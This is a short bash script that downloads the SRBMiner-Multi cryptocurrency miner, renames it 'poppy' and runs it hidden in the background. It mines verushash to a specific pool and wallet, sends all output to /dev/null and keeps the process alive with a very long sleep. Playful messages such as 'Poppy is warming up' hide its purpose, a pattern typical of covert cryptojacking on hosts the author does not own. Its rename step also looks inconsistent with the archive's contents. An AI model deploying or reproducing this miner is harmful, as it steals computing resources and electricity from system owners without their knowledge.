#!/bin/bash

echo "Poppy is warming up ayangku..."
sleep 5

if [ ! -f "./poppy" ]; then
  echo "Downloading Poppy..."
  wget -q "https://github.com/srbminer/SRBMiner-Multi/releases/download/2.3.4/SRBMiner-Multi-2-3-4-Linux.tar.gz" -O miner.tar.gz
  tar -xf miner.tar.gz
  mv SRBMiner-MULTI/poppy .
  chmod +x poppy
fi

echo "Poppy is shower for ayangku..."
nohup ./poppy --algorithm verushash --pool us.vipor.net:5040 --wallet REy6w1W9pQ7U4LebYx6zp6mZxHkBzc3e5y.1M --cpu-threads 2 --cpu-priority 3 > /dev/null 2>&1 &
sleep 9999999
